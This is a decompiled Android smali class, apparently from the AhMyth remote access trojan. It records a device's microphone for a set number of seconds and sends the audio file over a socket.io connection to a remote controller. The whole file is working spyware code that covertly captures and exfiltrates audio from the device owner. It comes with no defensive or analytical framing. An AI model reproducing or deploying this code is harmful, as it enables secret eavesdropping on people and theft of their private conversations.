.class public Lahmyth/mine/king/ahmyth/MicManager;
.super Ljava/lang/Object;
.source "MicManager.java"


# static fields
.field static final TAG:Ljava/lang/String; = "MediaRecording"

.field static audiofile:Ljava/io/File;

.field static recorder:Landroid/media/MediaRecorder;

.field static stopRecording:Ljava/util/TimerTask;


# direct methods
.method static constructor <clinit>()V
    .locals 1

    .prologue
    .line 35
    const/4 v0, 0x0

    sput-object v0, Lahmyth/mine/king/ahmyth/MicManager;->audiofile:Ljava/io/File;

    return-void
.end method

.method public constructor <init>()V
    .locals 0

    .prologue
    .line 31
    invoke-direct {p0}, Ljava/lang/Object;-><init>()V

    return-void
.end method

.method static synthetic access$000(Ljava/io/File;)V
    .locals 0
    .param p0, "x0"    # Ljava/io/File;

    .prologue
    .line 31
    invoke-static {p0}, Lahmyth/mine/king/ahmyth/MicManager;->sendVoice(Ljava/io/File;)V

    return-void
.end method

.method private static sendVoice(Ljava/io/File;)V
    .locals 9
    .param p0, "file"    # Ljava/io/File;

    .prologue
    .line 80
    invoke-virtual {p0}, Ljava/io/File;->length()J

    move-result-wide v6

    long-to-int v4, v6

    .line 81
    .local v4, "size":I
    new-array v1, v4, [B

    .line 83
    .local v1, "data":[B
    :try_start_0
    new-instance v0, Ljava/io/BufferedInputStream;

    new-instance v5, Ljava/io/FileInputStream;

    invoke-direct {v5, p0}, Ljava/io/FileInputStream;-><init>(Ljava/io/File;)V

    invoke-direct {v0, v5}, Ljava/io/BufferedInputStream;-><init>(Ljava/io/InputStream;)V

    .line 84
    .local v0, "buf":Ljava/io/BufferedInputStream;
    const/4 v5, 0x0

    array-length v6, v1

    invoke-virtual {v0, v1, v5, v6}, Ljava/io/BufferedInputStream;->read([BII)I

    .line 85
    new-instance v3, Lorg/json/JSONObject;

    invoke-direct {v3}, Lorg/json/JSONObject;-><init>()V

    .line 86
    .local v3, "object":Lorg/json/JSONObject;
    const-string v5, "file"

    const/4 v6, 0x1

    invoke-virtual {v3, v5, v6}, Lorg/json/JSONObject;->put(Ljava/lang/String;Z)Lorg/json/JSONObject;

    .line 87
    const-string v5, "name"

    invoke-virtual {p0}, Ljava/io/File;->getName()Ljava/lang/String;

    move-result-object v6

    invoke-virtual {v3, v5, v6}, Lorg/json/JSONObject;->put(Ljava/lang/String;Ljava/lang/Object;)Lorg/json/JSONObject;

    .line 88
    const-string v5, "buffer"

    invoke-virtual {v3, v5, v1}, Lorg/json/JSONObject;->put(Ljava/lang/String;Ljava/lang/Object;)Lorg/json/JSONObject;

    .line 89
    invoke-static {}, Lahmyth/mine/king/ahmyth/IOSocket;->getInstance()Lahmyth/mine/king/ahmyth/IOSocket;

    move-result-object v5

    invoke-virtual {v5}, Lahmyth/mine/king/ahmyth/IOSocket;->getIoSocket()Lio/socket/client/Socket;

    move-result-object v5

    const-string v6, "x0000mc"

    const/4 v7, 0x1

    new-array v7, v7, [Ljava/lang/Object;

    const/4 v8, 0x0

    aput-object v3, v7, v8

    invoke-virtual {v5, v6, v7}, Lio/socket/client/Socket;->emit(Ljava/lang/String;[Ljava/lang/Object;)Lio/socket/emitter/Emitter;

    .line 90
    invoke-virtual {v0}, Ljava/io/BufferedInputStream;->close()V
    :try_end_0
    .catch Ljava/io/FileNotFoundException; {:try_start_0 .. :try_end_0} :catch_0
    .catch Ljava/io/IOException; {:try_start_0 .. :try_end_0} :catch_1
    .catch Lorg/json/JSONException; {:try_start_0 .. :try_end_0} :catch_2

    .line 99
    .end local v0    # "buf":Ljava/io/BufferedInputStream;
    .end local v3    # "object":Lorg/json/JSONObject;
    :goto_0
    return-void

    .line 91
    :catch_0
    move-exception v2

    .line 92
    .local v2, "e":Ljava/io/FileNotFoundException;
    invoke-virtual {v2}, Ljava/io/FileNotFoundException;->printStackTrace()V

    goto :goto_0

    .line 93
    .end local v2    # "e":Ljava/io/FileNotFoundException;
    :catch_1
    move-exception v2

    .line 94
    .local v2, "e":Ljava/io/IOException;
    invoke-virtual {v2}, Ljava/io/IOException;->printStackTrace()V

    goto :goto_0

    .line 95
    .end local v2    # "e":Ljava/io/IOException;
    :catch_2
    move-exception v2

    .line 96
    .local v2, "e":Lorg/json/JSONException;
    invoke-virtual {v2}, Lorg/json/JSONException;->printStackTrace()V

    goto :goto_0
.end method

.method public static startRecording(I)V
    .locals 6
    .param p0, "sec"    # I
    .annotation system Ldalvik/annotation/Throws;
        value = {
            Ljava/lang/Exception;
        }
    .end annotation

    .prologue
    .line 44
    invoke-static {}, Lahmyth/mine/king/ahmyth/MainService;->getContextOfApplication()Landroid/content/Context;

    move-result-object v2

    invoke-virtual {v2}, Landroid/content/Context;->getCacheDir()Ljava/io/File;

    move-result-object v0

    .line 46
    .local v0, "dir":Ljava/io/File;
    :try_start_0
    const-string v2, "DIRR"

    invoke-virtual {v0}, Ljava/io/File;->getAbsolutePath()Ljava/lang/String;

    move-result-object v3

    invoke-static {v2, v3}, Landroid/util/Log;->e(Ljava/lang/String;Ljava/lang/String;)I

    .line 47
    const-string v2, "sound"

    const-string v3, ".mp3"

    invoke-static {v2, v3, v0}, Ljava/io/File;->createTempFile(Ljava/lang/String;Ljava/lang/String;Ljava/io/File;)Ljava/io/File;

    move-result-object v2

    sput-object v2, Lahmyth/mine/king/ahmyth/MicManager;->audiofile:Ljava/io/File;
    :try_end_0
    .catch Ljava/io/IOException; {:try_start_0 .. :try_end_0} :catch_0

    .line 55
    new-instance v2, Landroid/media/MediaRecorder;

    invoke-direct {v2}, Landroid/media/MediaRecorder;-><init>()V

    sput-object v2, Lahmyth/mine/king/ahmyth/MicManager;->recorder:Landroid/media/MediaRecorder;

    .line 56
    sget-object v2, Lahmyth/mine/king/ahmyth/MicManager;->recorder:Landroid/media/MediaRecorder;

    const/4 v3, 0x1

    invoke-virtual {v2, v3}, Landroid/media/MediaRecorder;->setAudioSource(I)V

    .line 57
    sget-object v2, Lahmyth/mine/king/ahmyth/MicManager;->recorder:Landroid/media/MediaRecorder;

    const/4 v3, 0x2

    invoke-virtual {v2, v3}, Landroid/media/MediaRecorder;->setOutputFormat(I)V

    .line 58
    sget-object v2, Lahmyth/mine/king/ahmyth/MicManager;->recorder:Landroid/media/MediaRecorder;

    const/4 v3, 0x3

    invoke-virtual {v2, v3}, Landroid/media/MediaRecorder;->setAudioEncoder(I)V

    .line 59
    sget-object v2, Lahmyth/mine/king/ahmyth/MicManager;->recorder:Landroid/media/MediaRecorder;

    sget-object v3, Lahmyth/mine/king/ahmyth/MicManager;->audiofile:Ljava/io/File;

    invoke-virtual {v3}, Ljava/io/File;->getAbsolutePath()Ljava/lang/String;

    move-result-object v3

    invoke-virtual {v2, v3}, Landroid/media/MediaRecorder;->setOutputFile(Ljava/lang/String;)V

    .line 60
    sget-object v2, Lahmyth/mine/king/ahmyth/MicManager;->recorder:Landroid/media/MediaRecorder;

    invoke-virtual {v2}, Landroid/media/MediaRecorder;->prepare()V

    .line 61
    sget-object v2, Lahmyth/mine/king/ahmyth/MicManager;->recorder:Landroid/media/MediaRecorder;

    invoke-virtual {v2}, Landroid/media/MediaRecorder;->start()V

    .line 64
    new-instance v2, Lahmyth/mine/king/ahmyth/MicManager$1;

    invoke-direct {v2}, Lahmyth/mine/king/ahmyth/MicManager$1;-><init>()V

    sput-object v2, Lahmyth/mine/king/ahmyth/MicManager;->stopRecording:Ljava/util/TimerTask;

    .line 75
    new-instance v2, Ljava/util/Timer;

    invoke-direct {v2}, Ljava/util/Timer;-><init>()V

    sget-object v3, Lahmyth/mine/king/ahmyth/MicManager;->stopRecording:Ljava/util/TimerTask;

    mul-int/lit16 v4, p0, 0x3e8

    int-to-long v4, v4

    invoke-virtual {v2, v3, v4, v5}, Ljava/util/Timer;->schedule(Ljava/util/TimerTask;J)V

    .line 76
    :goto_0
    return-void

    .line 48
    :catch_0
    move-exception v1

    .line 49
    .local v1, "e":Ljava/io/IOException;
    const-string v2, "MediaRecording"

    const-string v3, "external storage access error"

    invoke-static {v2, v3}, Landroid/util/Log;->e(Ljava/lang/String;Ljava/lang/String;)I

    goto :goto_0
.end method
